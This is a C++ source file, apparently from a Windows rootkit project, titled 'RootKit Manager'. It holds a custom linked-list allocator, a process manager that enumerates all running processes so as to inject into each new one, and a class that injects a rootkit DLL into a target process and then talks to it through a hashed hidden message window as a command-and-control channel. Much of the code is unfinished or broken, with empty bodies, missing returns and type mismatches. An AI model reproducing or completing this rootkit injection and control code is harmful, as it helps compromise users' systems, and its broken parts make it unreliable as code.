/* RootKit Manager (Injection and Controll) */
#include "riftstb.h"

// Deprecated System
// This File is responsible for hosting a "server" that the rootkit-module can connect to.
// it will manage the information presented to the rootkit module as an unordered and unsorted
// table of entrys through a doubly-linked list
#if 0 // Old Deprecated Code (Not yet removed for backup and reference reasons)
// Rules for this class:
// 1. Internaly refers to an entry as the listentry itself, outside of this class data is refered to as the data following its entry
// 2. the physical data uses relative addresses or relatives offsets, the class converts thes ra/ro's to expose them outside as addresses
// 3. the internals refer always to the whole while the outside access is limited to the object
// The data itself uses [template::T] addressing itself that gets internaly converted to usable VA's
template<
	typename T = dword, // default internal offset type: 32bit
	T Capacity = 0xffff // Max Capacity, default 64k
> class DlList {
	static constexpr size_t nHead = (sizeof(T) * 4);
	struct ListEntry {
		T prev; // relative address to previous entry (relative to BaseAddress)
		T next; // RA to next entry
		T size; // sizeof data
	};

public:
	DlList(         // Used to connect to the spcified
		void* pBase // Address of memoryblock
	)
		: m_BaseAddress((ptr)pBase) {}
	DlList(
		void* (*alloc)(size_t nSize) // memory allocation function
	)
		: m_BaseAddress((ptr)alloc(Capacity))
	{
		// memset((void*)m_BaseAddress, NULL, (sizeof(T) * 2));
		setEntry(Property::FirstEntry, nullptr),
			setEntry(Property::LastEntry, nullptr);
		const_cast<T&>(m_nCapacity) = Capacity - nHead;
		m_nCapacityUsed = 0;
		TracePoint("dl-list constructed at: %#08x\n", m_BaseAddress);
	}

	void* AddObject(
		_In_ void* pData,
		_In_ T     nData
	) {
		void* pRet = nullptr;

		if (getEntry(Property::FirstEntry)) {
			ListEntry* prev, * next;
			ListEntry* pEntry = FindCave(nData + sizeof(ListEntry), prev, next);
			if (!pEntry)
				return nullptr; // Not enough space found

			InsertEntry(pEntry, prev, next);
			if (!prev || !next)
				!prev ? setEntry(Property::FirstEntry, pEntry) : setEntry(Property::LastEntry, pEntry);

			pEntry->size = nData;
			void* mem = (void*)((ptr)pEntry + sizeof(ListEntry));
			memcpy(mem, pData, nData);
			pRet = mem;
		} else { // Special Handler to Add first entry (and initialze list) ((possibly use a trampoline for this in the future))
		         // Due to a possible underflow in the CaveFinder method this handler wouldnt be needed and could be removed,
		         // as the CaveFinder would still successfully find a valid area an would correctly initialize the header
			ListEntry* le = (ListEntry*)(m_BaseAddress + nHead);
			*le = { NULL, NULL, nData };
			memcpy((void*)((ptr)le + sizeof(ListEntry)), pData, nData);
			setEntry(Property::FirstEntry, le),
				setEntry(Property::LastEntry, le);
			pRet = (void*)((ptr)le + sizeof(ListEntry));
		}

		m_nCapacityUsed += nData + sizeof(ListEntry);
		TracePoint("Object Added to list at: %#08x,\n%17soffset: 0x%#04x\n", (ptr)pRet, "", (ptr)pRet - m_BaseAddress);
		return pRet;
	}

	// This needs to be expanded, removal of objects mostly works, cleaning the entries is still buggy
	void RemoveObject(
		_In_ void* pAddr
	) {
		ListEntry* pEntry = (ListEntry*)((ptr)pAddr - sizeof(ListEntry));
		TracePoint("Removing Object Entry at: 0x%08x\n", pEntry);

		if (pEntry->size) { // Make sure entry is valid
			if (pEntry->next && pEntry->prev) {
				// Fix up links (link previous and next entry to each other)
				((ListEntry*)(pEntry->prev + m_BaseAddress))->next = pEntry->next;
				((ListEntry*)(pEntry->next + m_BaseAddress))->prev = pEntry->prev;
			} else { // Special Handling incase it is first or last entry
				if (pEntry->next) { // Remove First
					((ListEntry*)(pEntry->next + m_BaseAddress))->prev = NULL;
					setEntry(Property::FirstEntry, (ListEntry*)(pEntry->next + m_BaseAddress));
				} else if (pEntry->prev) { // Remove Last
					((ListEntry*)(pEntry->prev + m_BaseAddress))->next = NULL;
					setEntry(Property::LastEntry, (ListEntry*)(pEntry->prev + m_BaseAddress));
				} else { // Remove last existing entry
					setEntry(Property::FirstEntry, nullptr),
						setEntry(Property::LastEntry, nullptr);
				}
			}

			m_nCapacityUsed -= pEntry->size + sizeof(ListEntry);
#if _DEBUG
			memset(pEntry, 0xcc, pEntry->size + sizeof(ListEntry));
#else
			pEntry->size = 0;
#endif
		}
	}

	void* GetFirstEntry() {
		return (void*)((ptr)getEntry(Property::FirstEntry) + sizeof(ListEntry));
	}
	void* GetLastEntry() {
		return (void*)((ptr)getEntry(Property::LastEntry) + sizeof(ListEntry));
	}
	void* GetPreviousEntry(_In_ void* addr) {
		ptr p = ((ListEntry*)((ptr)addr - sizeof(ListEntry)))->prev;
		if (p)
			return (void*)((ptr)(p + m_BaseAddress) + sizeof(ListEntry));
		return nullptr;
	}
	void* GetNextEntry(_In_ void* addr) {
		ptr p = ((ListEntry*)((ptr)addr - sizeof(ListEntry)))->next;
		if (p)
			return (void*)((ptr)(p + m_BaseAddress) + sizeof(ListEntry));
		return nullptr;
	}

private:
	void InsertEntry(
		_In_ ListEntry* pEntry,
		_In_ ListEntry* prev,
		_In_ ListEntry* next
	) {
		// Link entry into list
		if (prev) {
			prev->next = (ptr)pEntry - m_BaseAddress;
			pEntry->prev = (ptr)prev - m_BaseAddress;
		} else
			pEntry->prev = NULL;
		if (next) {
			next->prev = (ptr)pEntry - m_BaseAddress;
			pEntry->next = (ptr)next - m_BaseAddress;
		} else
			pEntry->next = NULL;
	}

	// finds space infornt the first, between the first and last and after the last entry
	// This will try to always find space at the lowest address possible
	ListEntry* FindCave(
		_In_  size_t      nSize,
		_Out_ ListEntry*& prev,
		_Out_ ListEntry*& next
	) {
		// Check for space before the current first entry // this currently fails
		if ((ptr)getEntry(Property::FirstEntry) - (m_BaseAddress + nHead) >= nSize) {
			prev = nullptr, next = getEntry(Property::FirstEntry);
			return (ListEntry*)(m_BaseAddress + nHead);
		}

		ListEntry* entry = getEntry(Property::FirstEntry);
		while (entry != getEntry(Property::LastEntry)) {
			if ((entry->next - (dword)((ptr)entry - m_BaseAddress)) - (entry->size + sizeof(ListEntry)) >= nSize) {
				prev = entry, next = (ListEntry*)((ptr)entry->next + m_BaseAddress);
				return (ListEntry*)((ptr)entry + (entry->size + sizeof(ListEntry)));
			} else
				entry = (ListEntry*)(entry->next + m_BaseAddress);
		}

		// Check for space after the current last entry
		if ((m_BaseAddress + m_nCapacity) - (ptr)getEntry(Property::LastEntry) >= nSize) {
			prev = getEntry(Property::LastEntry), next = nullptr;
			return (ListEntry*)((ptr)getEntry(Property::LastEntry) + (getEntry(Property::LastEntry)->size + sizeof(ListEntry)));
		}

		return nullptr;
	}

	enum Property {
		FirstEntry = sizeof(T) * 0,
		LastEntry = sizeof(T) * 1
	};
	inline ListEntry* getEntry(
		_In_ Property atr
	) {
		if (atr <= Property::LastEntry)
			return *(T*)(m_BaseAddress + atr) ? (ListEntry*)((*(T*)(m_BaseAddress + atr)) + m_BaseAddress) : nullptr;
		return nullptr;
	}
	inline void setEntry(
		_In_     Property atr,
		_In_opt_ void* addr
	) {
		if (atr <= Property::LastEntry)
			*(T*)(m_BaseAddress + atr) = addr ? (T)((ptr)addr - m_BaseAddress) : NULL;
	}

	const ptr m_BaseAddress;                                          // BaseAddress that points to the internal offset 0x00
	const T&  m_nCapacity     = *(T*)(m_BaseAddress + sizeof(T) * 2); // Maximum size of data this container can hold in bytes
	      T&  m_nCapacityUsed = *(T*)(m_BaseAddress + sizeof(T) * 3); // count of bytes currently used in the container
};

int dllisttest() {
	dbg::Benchmark bm(dbg::Benchmark::Resolution::NANO);
	bm.Begin();

	auto pipalloc = [](size_t nSize) {
		void* mem = malloc(nSize);
		memset(mem, 0xcd, nSize);
		return mem;
	};
	DlList<byte> list(pipalloc);
	char* liste[10];

	char a[] = "Hello";
	liste[0] = (char*)list.AddObject(a, sizeof(a));
	char b[] = "HELLO YOU asshole";
	liste[1] = (char*)list.AddObject(b, sizeof(b));
	char c[] = "This is a Test";
	liste[2] = (char*)list.AddObject(c, sizeof(c));

	list.RemoveObject(liste[1]);
	char d[] = "this is smaller";
	liste[1] = (char*)list.AddObject(d, sizeof(d));
	list.RemoveObject(liste[1]);
	char e[] = "this is abit longer than before";
	liste[1] = (char*)list.AddObject(e, sizeof(e));

	list.RemoveObject(liste[0]);
	char f[] = "Hello test2";
	liste[0] = (char*)list.AddObject(f, sizeof(f));

	char* entry = (char*)list.GetFirstEntry();
	do {
		char* tentry = entry;
		entry = (char*)list.GetNextEntry(entry);
		list.RemoveObject(tentry);
	} while (entry);

	uint32 dw = bm.End();
	return 0;
}



// NOTE: The injector has to be made twice to support x86 and x64 injection
//       For this the 32bit part will be embeded into the stub dll,
//       while the 64bit part will be build as a seperate executable acting as a service.
//       As of yet I dont know which project i will use for this and how i will exactly implement it:
//       I still have to think about how i will controll the injector (probably through WM_COPYDATA)
//       and how i will protect it from being abused (probably encryption, hashing and ids).
//       I might go as far as to making antire in _riftldr 32/64bit compatiple and using part of _riftldr
//       To fully protect the exposed module
class ProcessMgr {
	struct Process;

public:
	ProcessMgr()
		: m_nReserved(16),
		m_nCommited(0)
	{
		m_Heap = HeapCreate(HEAP_NO_SERIALIZE, 0, 0x1000 * sizeof(Process));
		m_procList = (Process*)HeapAlloc(m_Heap, HEAP_NO_SERIALIZE, 0x10 * sizeof(Process));
	}
	~ProcessMgr() {
		HeapFree(m_Heap, HEAP_NO_SERIALIZE, m_procList);
		HeapDestroy(m_Heap);
	}

	status EnumerateProcesses() {
		// Set all Entries to not Running (this will be important as we will set them back to running if they do,
		// if not they will be removed from the list (, this is basically important only for the Injector))
		for (uint16 i = 0; i < m_nCommited; i++)
			m_procList[i].bRunning = false;

		{	// enumerate all Processes and set them as running or add them to the processlist (inject into them)
			HANDLE hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
			if (hProcSnap == INVALID_HANDLE_VALUE)
				return -1; // Couldn't create a Process SnapShot
			PROCESSENTRY32W* pe32 = (PROCESSENTRY32W*)malloc(sizeof(PROCESSENTRY32W));
			pe32->dwSize = sizeof(*pe32);

			if (Process32FirstW(hProcSnap, pe32)) {
				do {
					bool bFound = false;
					for (uint16 i = 0; i < m_nCommited; i++)
						if (pe32->th32ProcessID == m_procList[i].dwPid) {
							m_procList[i].bRunning = true;
							bFound = true;
							break;
						}

					if (!bFound)
						// Do some special checks here to verify thet the process is actually worth injecting into
						IAddProcess(pe32->th32ProcessID);
				} while (Process32NextW(hProcSnap, pe32));
			} else
				return -2; // Couldn't enumerate/evaluate the Snapshot, yes this causes a Handle/Memory leak... Too bad.

			free(pe32);
			CloseHandle(hProcSnap);
		}

		// Cleanup the Processlist (unreference them)
		for (uint16 i = 0; i < m_nCommited; i++) {
		redo:
			if (!m_procList[i].bRunning) {
				IRemoveProcess(i);
				goto redo;
			}
		}

		return 0;
	}

private:
	struct Process {        // Array of Process Structers (dynamic)
		dword dwPid : 31;   // The Process Id
		dword bRunning : 1; // This field describes if a process is still running
	} *m_procList;
	HANDLE m_Heap;          // This is the heap where the ProcessList will be allocated
	uint16 m_nCommited;     // The number of elements currently in the list ("commited")
	uint16 m_nReserved;     // The number of elements currently allocated but free to use ("reserved")

	status IAddProcess(const DWORD dwPid) {
		if (m_nReserved <= m_nCommited)
			HeapReAlloc(m_Heap, HEAP_NO_SERIALIZE, m_procList, (m_nReserved += 4) * sizeof(Process));

		m_procList[m_nCommited].dwPid = dwPid;
		m_procList[m_nCommited].bRunning = true;
		m_nCommited++;

		// call injector here

		return 0;
	}
	status IRemoveProcess(const uint16 nIndex) {
		m_nCommited--;
		for (uint16 i = nIndex; i < m_nCommited; i++)
			m_procList[i] = m_procList[i + 1];

		if (m_nReserved - m_nCommited >= 4)
			HeapReAlloc(m_Heap, HEAP_NO_SERIALIZE, m_procList, (m_nReserved -= 4) * sizeof(Process));
		return 0;
	}
};
#endif

// New System
/* The new system has multiple levels
   it works by setting up a active server that manages a list of processes (dllist),
   each entry contains information about the process for the procmgr as well as a process object.
   The Process Object (RootKit Control Object) manages the connection to the rootkit and the process.
   The RootKit itself is mostly passive and only sets up a c2 handler waiting for instructions.
   If a process is found new without the procmgr is responsible to register it and create a rkc object,
   the rkc object is then responsible to map the rootkit into the process it is associated with.
   It will then create a connection to the rootkit
*/

#include "shared.h"

class Dllist {
	struct ListEntry {
		ListEntry* prev; // address to previous entry
		ListEntry* next; // addr to next entry
		size_t     size; // sizeof data (including the struct itself (for math reasons))
	};

public:
	Dllist(
		_In_ void*  nMem, // memory to use
		_In_ size_t nSize // Sizeof the dllist
	)
		: m_Base(nMem),
		m_nCapacity(nSize) {}

#if 0 // Replaced by using placement instead of allocation
	Dllist(
		_In_ void* (__cdecl* alloc)(size_t nSize), // memory allocation function
		_In_ void(__cdecl* free)(),                // memory release function
		_In_ size_t nSize                          // Sizeof the dllist
	)
		: m_Base(alloc(nSize)),
		m_nCapacity(nSize) {
		TracePoint("dl-list constructed at: %#08x\n", m_Base);
	}
#endif

	void* AllocateObject(
		_In_ size_t nSize
	) {
		// Allocate Object
		ListEntry* CurrentEntry = (this->*m_Trampoline)(nSize);
		m_nCapacityUsed += CurrentEntry->size;
		return (void*)((ptr)CurrentEntry + sizeof(ListEntry));
	}
	void* AddObject(
		_In_ void* pData,
		_In_ size_t nData
	) {
		void* pObj = AllocateObject(nData);

		// move data into object
		memcpy(pObj, pData, nData);
		TracePoint("Object Added to list at: %#010x,\n%17soffset: 0x%#06x\n", (ptr)pObj, "", (ptr)pObj - (ptr)m_Base);
		return pObj;
	}

	void RemoveObject(
		_In_ void* pAddr
	) {
		ListEntry* CurrentEntry = (ListEntry*)((ptr)pAddr - sizeof(ListEntry));

		if (CurrentEntry->size) { // Make sure entry is valid
			if (UnlinkEntry(CurrentEntry) == 3) // if LastEntry got removed: reset Jumper to initialize list
				m_Trampoline = &Dllist::TrampolineAddFirst;

			m_nCapacityUsed -= CurrentEntry->size;
		#if _DEBUG
			memset(CurrentEntry, 0xcc, CurrentEntry->size);
		#else
			pEntry->size = 0;
		#endif
		}

		TracePoint("Removed Object Entry at: 0x%010x\n", CurrentEntry);
	}

	void* GetFirstEntry() {
		return (void*)((ptr)m_FirstEntry + sizeof(ListEntry));
	}
	void* GetLastEntry() {
		return (void*)((ptr)m_LastEntry + sizeof(ListEntry));
	}
	void* GetPreviousEntry(_In_ void* addr) {
		ListEntry* le = ((ListEntry*)((ptr)addr - sizeof(ListEntry)))->prev;
		return (void*)(le ? (ptr)le + sizeof(ListEntry) : 0);
	}
	void* GetNextEntry(_In_ void* addr) {
		ListEntry* le = ((ListEntry*)((ptr)addr - sizeof(ListEntry)))->next;
		return (void*)(le ? (ptr)le + sizeof(ListEntry) : 0);
	}

private:
	status LinkEntry(             // Links a Entry into the List
		_In_     ListEntry* curr, // A Entry to link into the List
		_In_opt_ ListEntry* prev, // the Entry that should be be infornt of it
		_In_opt_ ListEntry* next  // the Entry that should follow it
	) {
		status s = 0;
		if (prev) {
			prev->next = curr;
			curr->prev = prev;
			s |= 0x1;
		} else
			curr->prev = nullptr;
		if (next) {
			next->prev = curr;
			curr->next = next;
			s |= 0x2;
		} else
			curr->next = nullptr;
		return s;
	}
	status UnlinkEntry(      // Unlinks a Entry from the List
		_In_ ListEntry* curr // The Entry to be Unlinked
	) {
		if (curr->next && curr->prev) {
			// Fix up links (link previous and next entry to each other)
			curr->prev->next = curr->next;
			curr->next->prev = curr->prev;
			return 0;
		} else { // Special Handling incase it is first or last entry
			if (curr->next) { // Remove First
				curr->next->prev = nullptr;
				m_FirstEntry = curr->next;
				return 1;
			} else if (curr->prev) { // Remove Last
				curr->prev->next = nullptr;
				m_LastEntry = curr->prev;
				return 2;
			} else // Remove last existing entry
				m_FirstEntry = m_LastEntry = nullptr;
			return 3;
		}
	}

	// finds space infornt the first, between the first and last or after the last entry
	// This will try to always find space at the lowest address possible
	ListEntry* FindCave(
		_In_                      size_t      size,
		_Outref_result_maybenull_ ListEntry*& prev,
		_Outref_result_maybenull_ ListEntry*& next
	) {
		// Check for space before the current first entry
		if ((ptr)m_FirstEntry - (ptr)m_Base >= size) {
			prev = nullptr, next = m_FirstEntry;
			return (ListEntry*)((ptr)m_FirstEntry - size);
		}

		ListEntry* CurrentEntry = m_FirstEntry;
		while (CurrentEntry != m_LastEntry) {
			if (((ptr)CurrentEntry->next - (ptr)CurrentEntry - CurrentEntry->size) >= size) {
				prev = CurrentEntry, next = CurrentEntry->next;
				return (ListEntry*)((ptr)CurrentEntry + (CurrentEntry->size));
			} else
				CurrentEntry = CurrentEntry->next;
		}

		// Check for space after the current last entry
		if (((ptr)m_Base + m_nCapacity) - ((ptr)m_LastEntry + m_LastEntry->size) >= size) {
			prev = m_LastEntry, next = nullptr;
			return (ListEntry*)((ptr)m_LastEntry + m_LastEntry->size);
		}

		prev = nullptr, next = nullptr;
		return nullptr;
	}

	ListEntry* TrampolineAddNormal(
		_In_ size_t nData
	) {
		ListEntry* prev, * next;
		ListEntry* curr = FindCave(nData + sizeof(ListEntry), prev, next);
		if (!curr)
			return nullptr; // Not enough space found

		switch (LinkEntry(curr, prev, next)) {
		case 1: m_LastEntry = curr; break;
		case 2: m_FirstEntry = curr; break;
		}

		curr->size = nData + sizeof(ListEntry);
		return curr;
	}
	// Special Handler to Add first entry (and initialze list) ((possibly use a trampoline for this in the future))
	// Due to a possible underflow in the CaveFinder method this handler wouldnt be needed and could be removed,
	// as the CaveFinder would still successfully find a valid area an would correctly initialize the header
	ListEntry* TrampolineAddFirst(
		_In_ size_t nData
	) {
		ListEntry* curr = (ListEntry*)m_Base;
		*curr = { nullptr, nullptr, nData + sizeof(ListEntry) };
		m_FirstEntry = curr, m_LastEntry = curr;
		m_Trampoline = &Dllist::TrampolineAddNormal;
		return curr;
	}

	const void*  m_Base;              // Base Address of where the dllist is located
	const size_t m_nCapacity;         // Maximum size of data this container can hold in bytes
	      size_t m_nCapacityUsed = 0; // count of bytes currently used in the container

	ListEntry* m_FirstEntry;
	ListEntry* m_LastEntry;

	// This allocates an Entry in the list and initializes its members
	ListEntry* (Dllist::* m_Trampoline)(_In_ size_t nData) = &Dllist::TrampolineAddFirst;
};

void*& ReferenceListAsVector(Dllist& list) {

}


class ProcessMgr {
	struct Process;

public:
	ProcessMgr()
		: m_nReserved(16),
		m_nCommited(0),
		m_procList(VirtualAlloc(nullptr, 0xffff, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE), 0xffff) {}
	~ProcessMgr() {

	}

	status EnumerateProcesses() {
		// Set all Entries to not Running (this will be important as we will set them back to running if they do,
		// if not they will be removed from the list (, this is basically important only for the Injector))
		for (uint16 i = 0; i < m_nCommited; i++)
			m_procList[i].bRunning = false;

		{	// enumerate all Processes and set them as running or add them to the processlist (inject into them)
			HANDLE hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
			if (hProcSnap == INVALID_HANDLE_VALUE)
				return -1; // Couldn't create a Process SnapShot
			PROCESSENTRY32W* pe32 = (PROCESSENTRY32W*)malloc(sizeof(PROCESSENTRY32W));
			pe32->dwSize = sizeof(*pe32);

			if (Process32FirstW(hProcSnap, pe32)) {
				do {
					bool bFound = false;
					for (uint16 i = 0; i < m_nCommited; i++)
						if (pe32->th32ProcessID == m_procList[i].dwPid) {
							m_procList[i].bRunning = true;
							bFound = true;
							break;
						}

					if (!bFound)
						// Do some special checks here to verify thet the process is actually worth injecting into
						IAddProcess(pe32->th32ProcessID);
				} while (Process32NextW(hProcSnap, pe32));
			} else
				return -2; // Couldn't enumerate/evaluate the Snapshot, yes this causes a Handle/Memory leak... Too bad.

			free(pe32);
			CloseHandle(hProcSnap);
		}

		// Cleanup the Processlist (unreference them)
		for (uint16 i = 0; i < m_nCommited; i++) {
		redo:
			if (!m_procList[i].bRunning) {
				IRemoveProcess(i);
				goto redo;
			}
		}

		return 0;
	}

private:
	Dllist m_procList;

	HANDLE m_Heap;          // This is the heap where the ProcessList will be allocated
	uint16 m_nCommited;     // The number of elements currently in the list ("commited")
	uint16 m_nReserved;     // The number of elements currently allocated but free to use ("reserved")

	status IAddProcess(const DWORD dwPid) {
		if (m_nReserved <= m_nCommited)
			HeapReAlloc(m_Heap, HEAP_NO_SERIALIZE, m_procList, (m_nReserved += 4) * sizeof(Process));

		m_procList[m_nCommited].dwPid = dwPid;
		m_procList[m_nCommited].bRunning = true;
		m_nCommited++;

		return 0;
	}
	status IRemoveProcess(const uint16 nIndex) {
		m_nCommited--;
		for (uint16 i = nIndex; i < m_nCommited; i++)
			m_procList[i] = m_procList[i + 1];

		if (m_nReserved - m_nCommited >= 4)
			HeapReAlloc(m_Heap, HEAP_NO_SERIALIZE, m_procList, (m_nReserved -= 4) * sizeof(Process));
		return 0;
	}
};

class ProcessMgr2 {
	struct Process {        // Array of Process Structers (dynamic)
		dword dwPid : 31;   // The Process Id
		dword bRunning : 1; // This field describes if a process is still running
	} *m_procList;

public:
	ProcessMgr2();
	~ProcessMgr2();

private:

};

class rkc
	: private ALG::HexConvA,
	private cry::Hash {
public:
	rkc(
		_In_ uint32 uPId
	)
		: m_PId(uPId)
	{


	}
	~rkc() {

	}

	status InjectRK() {
	#ifdef _DEBUG
		return dbg::InjectDllW(L"d:\\visualstudio\\repos\\win32.rift\\out\\bin\\riftrk.dll", m_PId);
	#else

	#endif
		Connect();
	}

	status Connect() {
		HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, false, m_PId);
		wchar mod[MAX_PATH];
		K32GetProcessImageFileNameW(hProc, mod, MAX_PATH);

		HashData(mod, wcslen(mod));
		HashFinalize();
		hash h = m_Hash;

		// Compact Hash
		for (uint8 i = 1; i < 4; i++)
			*(qword*)&h ^= ((qword*)&h)[i];

		char szc[256];
		BinToHex(&h, 8, szc);

		m_hWnd = FindWindowExA(HWND_MESSAGE, NULL, szc, szc);
		if (!m_hWnd)
			return -1; // MessageWindow not found

		status s = SendIOCtl(0x7fffffff, nullptr, 0);
		if (s > 0)
			return -2; // Invalid Message
	}

	status SendIOCtl(
		_In_ uint32 ctlc,
		_In_ void* pData,
		_In_ size_t nData
	) {
		COPYDATASTRUCT cd;
		cd.dwData = ctlc;

		return SendMessageW(m_hWnd, WM_COPYDATA, NULL, (LPARAM)&cd);
	}

private:
	HWND m_hWnd;
	uint32 m_PId;
};

class test {
public:
	test()
		: list1(malloc, 0xffff),
		list2(malloc, 0xffff) {

	}

	rkc* add() {
		return new(list1.AllocateObject(sizeof(rkc))) rkc(0);

	}

	void remove(rkc* rk) {
		rk->~rkc();
		list1.RemoveObject(rk);
	}

	Dllist list1;
	Dllist list2;
};

/*
void* operator new(size_t size, Dllist& list) {
	return list.AllocateObject(size);
}
*/

void RootKitTest() {




	rkc rk2(utl::GetPIdByNameW(L"TargetApplication.exe"));
}